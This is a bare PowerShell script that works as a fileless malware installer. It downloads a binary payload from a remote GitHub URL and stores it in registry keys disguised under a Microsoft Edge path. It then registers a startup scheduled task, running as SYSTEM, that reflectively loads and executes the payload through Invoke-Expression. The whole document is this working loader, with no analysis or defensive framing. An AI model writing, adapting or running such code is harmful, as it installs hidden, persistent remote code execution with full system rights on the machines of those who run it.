$basePath = "HKLM:\Software\Microsoft\Edge\382"
$keys = @("files", "tasks", "keys")

New-Item -Path $basePath -Force

foreach ($key in $keys) {
    New-Item -Path "$basePath\$key" -Force
}

New-ItemProperty -Path "$basePath\files" -Name "382 startup" -PropertyType String -Value "C:\Windows\System32\Tasks\382"
New-ItemProperty -Path "$basePath\keys" -Name "382 main" -PropertyType String -Value "SOFTWARE\Microsoft\Edge\382"
New-ItemProperty -Path "$basePath\keys" -Name "382 startup" -PropertyType String -Value "SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\382"
New-ItemProperty -Path "$basePath\tasks" -Name "382 startup" -PropertyType String -Value "382"
New-ItemProperty -Path "$basePath" -Name "shell" -PropertyType String -Value "([Reflection.Assembly]::Load((gp `"HKLM:\Software\Microsoft\Edge\382`").root)).GetType('Program').GetMethod('Main',('NonPublic,Static' -bor [Reflection.BindingFlags]::InvokeMethod)).Invoke(`$null,@(@(,[string[]]@())))"

$url = "https://raw.githubusercontent.com/blousekool/BDtools/refs/heads/main/382/root.txt"

$webRequest = [System.Net.WebRequest]::Create($url)
$response = $webRequest.GetResponse()
$responseStream = $response.GetResponseStream()
$memoryStream = New-Object System.IO.MemoryStream
$responseStream.CopyTo($memoryStream)
$binaryData = $memoryStream.ToArray()

Set-ItemProperty -Path $basePath -Name "root" -Value $binaryData -Type Binary

#create startup task
$Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "`$keyValue = (gp \'Registry::HKLM\SOFTWARE\Microsoft\Edge\382').shell; Invoke-Expression -Command `$keyValue"
$Trigger = New-ScheduledTaskTrigger -AtStartup
$Principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount
Register-ScheduledTask -TaskName "382" -Action $Action -Trigger $Trigger -Principal $Principal

Start-ScheduledTask -TaskName "382"

